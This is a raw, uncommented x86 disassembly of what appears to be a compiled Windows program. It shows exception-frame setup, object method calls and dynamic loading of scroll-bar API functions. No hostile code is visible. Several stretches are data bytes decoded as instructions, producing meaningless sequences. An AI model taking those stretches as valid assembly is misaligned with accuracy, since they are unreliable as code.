add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bh
mov al 0x42
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
jb r-xdata
add ah ch
jae r-xdata
mov cl 0x42
outsb
je r-xdata
jns r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
or [ eax + 0x65 ] ecx
insb
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
push esi
je r-xdata
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x42b1b4c0 ]
add [ eax + eax ] cl
add [ eax ] al
in al dx
mov dl 0x42
popad
outsb
popad
jb r-xdata
add al al
dec edi
jae r-xdata
insb
je r-xdata
outsb
je r-xdata
outsd
outsb
je r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42be1f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
add [ eax + eax ] al
inc edx
insd
inc ebp
js r-xdata
dec ecx
jns r-xdata
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
mov cl 0x42
add bh bh
push [ ecx + esi * 4 + 0x42 ]
adc ecx [ ecx + 0x45 ]
insd
movsb [ edi ] [ esi ]
adc [ eax ] eax
add [ ebx - 0x6d ] edx
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
jae r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403ff0
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0xb1347265
inc edx
add [ ecx ] al
xchg bx ax
cld
inc eax
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
inc eax
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
outsb
je r-xdata
inc edx
outsb
dec eax
insb
jo r-xdata
cmp cl [ ecx ]
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x42b138c0 ]
add [ edi ] cl
dec [ ebx + 0x42b0c8c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
jmp r-xdata
int3
mov eax eax
imul ebp [ edi + 0x6e ] 0x9800408d
mov dl 0x42
add [ eax ] al
add [ eax ] al
jae r-xdata
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
movsb [ edi ] [ esi ]
adc [ eax ] eax
add [ eax - 0x6d ] ebx
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
outsb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42be26
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a50
lea eax [ ebp - 0x8 ]
call sub_4059cc
retn
inc ebx
xor edi edi
lea eax [ eax ]
xor al 0xb2
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp - 0x4dcbffc0 ]
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b080
retn
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jns r-xdata
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a10
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42a68c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4059e4
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a10
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42b343
aad 0xb2
inc edx
add bh bl
mov dl 0x42
add cl ch
mov dl 0x42
add [ ebp - 0x3affbd4e ] bh
mov dl 0x42
add ch cl
mov dl 0x42
add [ ebx ] ah
mov bl 0x42
add [ 0x370042b3 ] ch
std
dec esp
int3
cmp al [ ebx - 0x4d ]
inc edx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x6d ] dl
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
mov bl 0x42
add bl dh
mov dl 0x42
add bl bh
mov dl 0x42
add [ ebx ] al
mov bl 0x42
add [ ebx ] cl
mov bl 0x42
add [ ebx ] dl
mov bl 0x42
add [ ebx ] bl
mov bl 0x42
add [ edx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
and esi [ ebx - 0x4cd2ffbe ]
inc edx
add [ edi ] dh
cmp bl [ ebx - 0x4d ]
inc edx
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
or [ edx + eax * 2 + 0x42b37f00 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] cl
mov ah 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
mov ah 0x42
add [ eax ] dh
add [ eax ] al
add [ edx + edx + 0x40 ] dl
add [ esp + esi + 0x5a4c0040 ] dl
inc eax
add [ eax + 0x5a ] bl
inc eax
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add [ eax + 0x5a ] ch
inc eax
add [ eax ] al
xor al [ eax ]
call 0xe42f6c8
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + esi * 4 + 0xc0042 ] cl
add [ eax ] al
hlt
sub_42b450
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42b4c6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_42b5dc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4059e4
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b4cd
lea eax [ ebp - 0x8 ]
call sub_4059cc
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b568
mov [ rw-data ] eax
sub_42b4d4
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b568
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405a10
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42b52c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4059e4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42b568
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40321c
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a650
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a650
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a650
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403f9c
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42b5dc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42b6dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b52c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42a6a0
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_4059cc
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d430
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4059cc
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d430
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b52c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42a6a0
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b52c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42a6a0
mov ecx r-xdata
call sub_405a10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b6e4
lea eax [ ebp - 0xc ]
call sub_4059cc
lea eax [ ebp - 0x8 ]
call sub_4059cc
retn
sub edx 0xfffffff8
sub_42b6fc
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_42a68c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42b73c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_42a68c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42b76c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42b8fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_42a68c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b899
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b905
lea eax [ ebp - 0x10 ]
call sub_403f9c
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42a68c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
mov eax esi
xor edx edx
call sub_42a68c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42a68c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40324c
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_42a68c
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42b90c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42b9f1
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403ff0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b9f8
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a50
lea eax [ ebp - 0x8 ]
call sub_4059cc
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42a68c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4059e4
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a10
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42a68c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4059e4
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a10
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42bc28
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42bd1b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403ff0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bd22
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a50
lea eax [ ebp - 0x10 ]
call sub_4059cc
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405a10
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_42a68c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4059e4
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405a10
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42bd40
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42be1f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403ff0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42be26
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a50
lea eax [ ebp - 0x8 ]
call sub_4059cc
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a10
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42a68c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4059e4
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a10
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42be40
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405a40
xor eax eax
push ebp
push sub_42be8f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4059e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42be96
lea eax [ ebx + 0xc ]
call sub_4059cc
sub_42be9a
mov eax eax
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40444c
xor eax eax
push ebp
push sub_42bf31
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403ff0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42bc28
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bf38
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax ebx
call sub_42b73c
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42b76c
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42b90c
sub_42bf5c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_42a68c
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_42a68c
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_41a128
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_42a68c
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_41a128
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_41a128
sub_42bfe8
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax esi
call sub_42b6fc
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_40324c
mov eax [ esi + 0x14 ]
call sub_40324c
mov eax [ esi + 0x10 ]
call sub_40324c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_4059cc
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_42c03a
mov eax eax
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c073
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c07a
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42c084
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c0a9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c0b0
retn
sub_42c0bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c0ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c0f4
retn
mov eax [ rw-data ]
call sub_40324c
sub_42c100
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42c134
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42c15c
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42c3de
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c405
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c40c
retn
sub_42c471
les eax [ edx ]
push cs
push esp
push ebx
jns r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x30 ] si
les eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd st4
inc edx
add [ eax + eax ] bl
add [ eax ] al
and ah al
inc edx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
xor al 0xc5
inc edx
add [ ebp + eax * 8 + 0x42 ] ah
add [ eax - 0x3b ] dh
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
sub_42c4f4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40321c
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42c534
push ebx
push esi
call sub_4035d8
mov ebx edx
